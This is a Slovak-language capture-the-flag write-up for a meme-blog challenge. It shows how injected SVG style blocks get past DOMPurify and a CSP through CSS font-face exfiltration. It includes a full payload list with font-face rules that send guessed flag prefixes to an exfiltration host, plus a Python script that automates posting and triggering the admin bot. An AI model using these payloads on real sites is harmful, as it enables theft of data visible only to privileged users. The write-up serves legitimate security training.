# Zadanie

EN: We've received another request for a penetration test. The customer claims they have implemented strong measures against client-side attacks.

**The challenge is available at:**¬†[http://exp.cybergame.sk:7020/](http://exp.cybergame.sk:7020/)¬†**The admin bot is available at:**¬†[http://exp.cybergame.sk:7021/](http://exp.cybergame.sk:7021/)

**Note:**¬†The instances have¬†**no internet access**. If needed, please use a RequestBin service running at¬†[http://exp.cybergame.sk:7023](http://exp.cybergame.sk:7023/)¬†for exfiltration. It is reachable at¬†[http://exfiltration:8000](http://exfiltration:8000/)¬†from within the challenge network.

SK: Dostali sme po≈æiadavku na ƒèal≈°√≠ penetraƒçn√Ω test. Z√°kazn√≠k tvrd√≠, ≈æe implementoval siln√∫ ochranu proti client-side √∫tokom.

**Aplik√°cia je dostupn√° na**:¬†[http://exp.cybergame.sk:7020/](http://exp.cybergame.sk:7020/)¬†**Admin bot je dostupn√Ω na:**¬†[http://exp.cybergame.sk:7021/](http://exp.cybergame.sk:7021/)

**Pozn√°mka:**¬†In≈°tancie¬†**nemaj√∫ pr√≠stup na internet**. Ak je to potrebn√©, na exfiltr√°ciu pou≈æite slu≈æbu RequestBin be≈æiacu na¬†[http://exp.cybergame.sk:7023](http://exp.cybergame.sk:7023/). Z vn√∫tra siete je dostupn√° na adrese¬†[http://exfiltration:8000](http://exfiltration:8000/).

**S√∫bory**

- memeblog_handout.zip

## Rie≈°enie

Str√°nka aplik√°cie na porte 7020 je ak√Ωsi blog, do ktor√©ho sa m√¥≈æeme registrova≈• a prihl√°si≈• a po prihl√°sen√≠ m√°me mo≈ænos≈• prida≈• pr√≠spevok. Tento v≈°ak neuzrie svetlo sveta pok√Ωm ho neschv√°li admin. ƒåo hovoria dostupn√© zdroj√°ky?

Po rozbalen√≠ arch√≠vu a pozornom prezret√≠ zdroj√°kov vid√≠m, ≈æe m√°me k dispoz√≠cii info o tom, kde sa vlajka nach√°dza, dokonca aj druh√°. Flag1 sa nach√°dza v `src/includes/header.php`

```php
<?php if ($auth->isLoggedIn() && $auth->isAdmin()): ?>
    <span class="admin-message" flag1="SK-CERT{flag1_for_testing}">Hello, Admin! (À∂ÀÉ ·µï ÀÇÀ∂)</span>
<?php endif; ?>
```

Vlajka je s√∫ƒças≈•ou hlaviƒçky stranky, ale vid√≠ ju, resp. m√° ju v renderovanom zdroj√°ku len admin.

V zadan√≠ v≈°ak m√°me aj admin-bot str√°nku, ƒço je vlastne str√°nka, do ktorej vlo≈æ√≠me preview url n√°≈°ho pr√≠spevku, do ktorej sme predt√Ωm vlo≈æili nejak√Ω obsah.

Str√°nka sa na prv√Ω pohƒæad zd√° nepriestren√°, mnoho ƒçast√≠ html k√≥du, ktor√Ω tam vlo≈æ√≠me prech√°dza kontrolou cez DOMpurify, ƒço defakto okre≈°e html, aby bol sejf. ≈æiadne skripty ani niƒç podobn√©, nehrozia. Ak sa n√°m podar√≠ nieƒço vlo≈æi≈•, st√°le n√°s obmedzuje csp (Content Security Policy), ktor√© m√°me definovan√© nasledovne

```php
<?php
$nonce = base64_encode(random_bytes(8));

$csp = "script-src 'nonce-$nonce' 'sha256-0fQyyBH4tw1haqwijgfZtcoBLBYVWJPwJ4iJjHFUwRY=' 'sha256-I1rbvXqXZmrMValU4SWC65enfArEBy0F8Yc7lJyp2Ms=' 'unsafe-hashes' 'self'; " .
       "style-src 'self' 'unsafe-inline'; " .
       "img-src 'self'; " .
       "base-uri 'self'; " .
       "object-src 'none'; ";

header("Content-Security-Policy: $csp");
?>
```

Vid√≠me, ≈æe request na obr√°zky sa po≈°le, resp prejde len pokiaƒæ je url priamo zo str√°nky, ktor√∫ vol√°me, ale ƒço mi bije do oƒç√≠ je unsafe-inline v style, tak≈æe toto by mohla by≈• cesta, napr√≠klad "custom" fontom.. Smrdl√≠ to CSS exfiltration, tak rovno sk√∫sim, ƒçi mi po≈°le na reqbin odpoveƒè keƒè tam vlo≈æ√≠m ƒço pozn√°m, ≈æe sa nach√°dza vo vlajke.

```html
<svg>
<style>
@font-face{font-family:'xx';src:url('http://exfiltration:8000/writeup/ping')}.admin-message[flag1^='SK-CERT{']{font-family:'xx'!important}
</style>
</svg>
```

a na reqbin mi prist√°l request na ping... Teraz ak po≈°lem toƒælko font riadkov, ≈æe za zn√°mou zn√°mou ƒças≈•ou vlajky sa traf√≠me na nasleduj√∫ci znak, tak tak√Ω request by n√°m mal pr√≠s≈•, ktor√Ω bude obsahova≈• zhodu.. Takto p√≠smenko po p√≠smenku odhal√≠me cel√∫ vlajku..

Do pr√≠spevku vlo≈æ√≠m probe

```html
<svg>
<style>
@font-face{font-family:'chr0';src:url('http://exfiltration:8000/writeup/SK-CERT{0')}.admin-message[flag1^='SK-CERT{0']{font-family:'chr0'!important}
@font-face{font-family:'chr1';src:url('http://exfiltration:8000/writeup/SK-CERT{1')}.admin-message[flag1^='SK-CERT{1']{font-family:'chr1'!important}
@font-face{font-family:'chr2';src:url('http://exfiltration:8000/writeup/SK-CERT{2')}.admin-message[flag1^='SK-CERT{2']{font-family:'chr2'!important}
@font-face{font-family:'chr3';src:url('http://exfiltration:8000/writeup/SK-CERT{3')}.admin-message[flag1^='SK-CERT{3']{font-family:'chr3'!important}
@font-face{font-family:'chr4';src:url('http://exfiltration:8000/writeup/SK-CERT{4')}.admin-message[flag1^='SK-CERT{4']{font-family:'chr4'!important}
@font-face{font-family:'chr5';src:url('http://exfiltration:8000/writeup/SK-CERT{5')}.admin-message[flag1^='SK-CERT{5']{font-family:'chr5'!important}
@font-face{font-family:'chr6';src:url('http://exfiltration:8000/writeup/SK-CERT{6')}.admin-message[flag1^='SK-CERT{6']{font-family:'chr6'!important}
@font-face{font-family:'chr7';src:url('http://exfiltration:8000/writeup/SK-CERT{7')}.admin-message[flag1^='SK-CERT{7']{font-family:'chr7'!important}
@font-face{font-family:'chr8';src:url('http://exfiltration:8000/writeup/SK-CERT{8')}.admin-message[flag1^='SK-CERT{8']{font-family:'chr8'!important}
@font-face{font-family:'chr9';src:url('http://exfiltration:8000/writeup/SK-CERT{9')}.admin-message[flag1^='SK-CERT{9']{font-family:'chr9'!important}
@font-face{font-family:'chra';src:url('http://exfiltration:8000/writeup/SK-CERT{a')}.admin-message[flag1^='SK-CERT{a']{font-family:'chra'!important}
@font-face{font-family:'chrb';src:url('http://exfiltration:8000/writeup/SK-CERT{b')}.admin-message[flag1^='SK-CERT{b']{font-family:'chrb'!important}
@font-face{font-family:'chrc';src:url('http://exfiltration:8000/writeup/SK-CERT{c')}.admin-message[flag1^='SK-CERT{c']{font-family:'chrc'!important}
@font-face{font-family:'chrd';src:url('http://exfiltration:8000/writeup/SK-CERT{d')}.admin-message[flag1^='SK-CERT{d']{font-family:'chrd'!important}
@font-face{font-family:'chre';src:url('http://exfiltration:8000/writeup/SK-CERT{e')}.admin-message[flag1^='SK-CERT{e']{font-family:'chre'!important}
@font-face{font-family:'chrf';src:url('http://exfiltration:8000/writeup/SK-CERT{f')}.admin-message[flag1^='SK-CERT{f']{font-family:'chrf'!important}
@font-face{font-family:'chrg';src:url('http://exfiltration:8000/writeup/SK-CERT{g')}.admin-message[flag1^='SK-CERT{g']{font-family:'chrg'!important}
@font-face{font-family:'chrh';src:url('http://exfiltration:8000/writeup/SK-CERT{h')}.admin-message[flag1^='SK-CERT{h']{font-family:'chrh'!important}
@font-face{font-family:'chri';src:url('http://exfiltration:8000/writeup/SK-CERT{i')}.admin-message[flag1^='SK-CERT{i']{font-family:'chri'!important}
@font-face{font-family:'chrj';src:url('http://exfiltration:8000/writeup/SK-CERT{j')}.admin-message[flag1^='SK-CERT{j']{font-family:'chrj'!important}
@font-face{font-family:'chrk';src:url('http://exfiltration:8000/writeup/SK-CERT{k')}.admin-message[flag1^='SK-CERT{k']{font-family:'chrk'!important}
@font-face{font-family:'chrl';src:url('http://exfiltration:8000/writeup/SK-CERT{l')}.admin-message[flag1^='SK-CERT{l']{font-family:'chrl'!important}
@font-face{font-family:'chrm';src:url('http://exfiltration:8000/writeup/SK-CERT{m')}.admin-message[flag1^='SK-CERT{m']{font-family:'chrm'!important}
@font-face{font-family:'chrn';src:url('http://exfiltration:8000/writeup/SK-CERT{n')}.admin-message[flag1^='SK-CERT{n']{font-family:'chrn'!important}
@font-face{font-family:'chro';src:url('http://exfiltration:8000/writeup/SK-CERT{o')}.admin-message[flag1^='SK-CERT{o']{font-family:'chro'!important}
@font-face{font-family:'chrp';src:url('http://exfiltration:8000/writeup/SK-CERT{p')}.admin-message[flag1^='SK-CERT{p']{font-family:'chrp'!important}
@font-face{font-family:'chrq';src:url('http://exfiltration:8000/writeup/SK-CERT{q')}.admin-message[flag1^='SK-CERT{q']{font-family:'chrq'!important}
@font-face{font-family:'chrr';src:url('http://exfiltration:8000/writeup/SK-CERT{r')}.admin-message[flag1^='SK-CERT{r']{font-family:'chrr'!important}
@font-face{font-family:'chrs';src:url('http://exfiltration:8000/writeup/SK-CERT{s')}.admin-message[flag1^='SK-CERT{s']{font-family:'chrs'!important}
@font-face{font-family:'chrt';src:url('http://exfiltration:8000/writeup/SK-CERT{t')}.admin-message[flag1^='SK-CERT{t']{font-family:'chrt'!important}
@font-face{font-family:'chru';src:url('http://exfiltration:8000/writeup/SK-CERT{u')}.admin-message[flag1^='SK-CERT{u']{font-family:'chru'!important}
@font-face{font-family:'chrv';src:url('http://exfiltration:8000/writeup/SK-CERT{v')}.admin-message[flag1^='SK-CERT{v']{font-family:'chrv'!important}
@font-face{font-family:'chrw';src:url('http://exfiltration:8000/writeup/SK-CERT{w')}.admin-message[flag1^='SK-CERT{w']{font-family:'chrw'!important}
@font-face{font-family:'chrx';src:url('http://exfiltration:8000/writeup/SK-CERT{x')}.admin-message[flag1^='SK-CERT{x']{font-family:'chrx'!important}
@font-face{font-family:'chry';src:url('http://exfiltration:8000/writeup/SK-CERT{y')}.admin-message[flag1^='SK-CERT{y']{font-family:'chry'!important}
@font-face{font-family:'chrz';src:url('http://exfiltration:8000/writeup/SK-CERT{z')}.admin-message[flag1^='SK-CERT{z']{font-family:'chrz'!important}
@font-face{font-family:'chr_';src:url('http://exfiltration:8000/writeup/SK-CERT{_')}.admin-message[flag1^='SK-CERT{_']{font-family:'chr_'!important}
@font-face{font-family:'chr-';src:url('http://exfiltration:8000/writeup/SK-CERT{-')}.admin-message[flag1^='SK-CERT{-']{font-family:'chr-'!important}
@font-face{font-family:'chr}';src:url('http://exfiltration:8000/writeup/SK-CERT{}')}.admin-message[flag1^='SK-CERT{}']{font-family:'chr}'!important}
</style>
</svg>
```

preview url m√°m `[Meme History Blog](http://exp.cybergame.sk:7020/preview.php?id=639999a2f8f72d1e5fa322b72b9c1980)` admin botovi teda po≈°lem `[Meme History Blog](http://web/preview.php?id=639999a2f8f72d1e5fa322b72b9c1980)`, preto≈æe ako v zadin√≠ p√≠≈°u, nie je tam pr√≠stup na internet a pozorujem reqbin.

A na reqbine sa mi zjavil request `GET¬†/writeup/SK-CERT{n`, super. m√°me prv√© p√≠smenko vlajky a teraz namiesto `SK-CERT{`  d√°me v≈°ade `SK-CERT{n` a mal by sa objavi≈• ƒèal≈°√≠ znak. Postup opakujeme a≈æ k√Ωm neobjav√≠me posledn√© `}`.

Alebo to zautomatizova≈• skriptom, ktor√Ω priebe≈æne vyp√Ωta p√≠smenko a povytv√°ra nov√© blogposty, ktor√© rovno po≈°le na schv√°lenie adminovi..

```python
#!/usr/bin/env python3
"""
Auto-leaker (font-face varianta)
‚Ä¢ z ka≈æd√©ho pokusu vygeneruje @font-face pravidlo s URL do tvojho RequestBinu
‚Ä¢ font prirad√≠ k .admin-message iba vtedy, ak prefix vlajky sed√≠
‚Ä¢ CSP neblokuje s≈•ahovanie fontov ‚Üí z tvojho hooku vid√≠≈°, ktor√Ω prefix zafungoval
"""

import requests, string, sys, time
from urllib.parse import urljoin, quote_plus

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  NASTAVENIA  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
BASE_URL_APP  = "http://exp.cybergame.sk:7020/"
VISIT_URL     = "http://exp.cybergame.sk:7021/visit"
WEBHOOK_ID    = "tvojerqbinid" 
COOKIE_HEADER = "PHPSESSID=xxx;" 

# ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

WEBHOOK_FULL  = f"http://exfiltration:8000/{WEBHOOK_ID}"
CHARSET       = string.ascii_lowercase + string.digits + "_-}"
PREFIX        = "SK-CERT{"

sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (font-leaker)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": COOKIE_HEADER
})

def svg_payload(prefix: str) -> str:
    css_lines = []
    for ch in CHARSET:
        guess      = prefix + ch
        url        = f"{WEBHOOK_FULL}/{guess}"
        css_lines += [
            f"@font-face{{font-family:'{ch}';src:url('{url}')}}",
            f".admin-message[flag1^='{guess}']{{font-family:'{ch}'!important}}\n"
        ]
    return (
        "<svg><style>" + "".join(css_lines) + "</style></svg>"
        "\n"
    )

def new_post(html: str) -> str:
    r = sess.post(urljoin(BASE_URL_APP, "create.php"),
                  data={"title": "font-probe", "content": html},
                  allow_redirects=False)
    if r.status_code != 302 or "Location" not in r.headers:
        raise RuntimeError("create.php failed")
    return urljoin(BASE_URL_APP, r.headers["Location"])

def notify_admin(url: str) -> None:
    r = sess.post(VISIT_URL, data={"url": url})
    if r.status_code != 200:
        raise RuntimeError("/visit failed")

try:
    flag = PREFIX
    while not flag.endswith("}"):
        print(f"\n=== prefix: {flag}")
        payload = svg_payload(flag)
        print(payload)
        post_url = new_post(payload)
        post_url = post_url.replace("http://exp.cybergame.sk:7020/", "http://web/")
        print("  ‚Ä¢ post:", post_url)
        notify_admin(post_url)
        print("  ‚Ä¢ poƒçkaj na hit ‚Üí", f"{WEBHOOK_FULL}/<HIT>")
        ch = input("  ‚Ä¢ ƒèal≈°√≠ znak > ").strip()
        if len(ch) != 1:
            print("    ‚ö† zadaj 1 znak")
            continue
        flag += ch
        time.sleep(0.4)

    print("\nüéâ FILENAME =", flag)

except (KeyboardInterrupt, EOFError):
    print("\n[ukonƒçen√©]")
except Exception as e:
    print("‚úñ", e, file=sys.stderr)
    sys.exit(1)
```

A na konci m√°me 

```
  ‚Ä¢ post: http://web/preview.php?id=97bdbaa8f090b05d9c108ccbc42c4295
  ‚Ä¢ poƒçkaj na hit ‚Üí http://exfiltration:8000/writeup/<HIT>
  ‚Ä¢ ƒèal≈°√≠ znak > }

üéâ FLAG = SK-CERT{n0_js_n0_fun_they_s41d}
```

## Vlajka

    SK-CERT{n0_js_n0_fun_they_s41d}
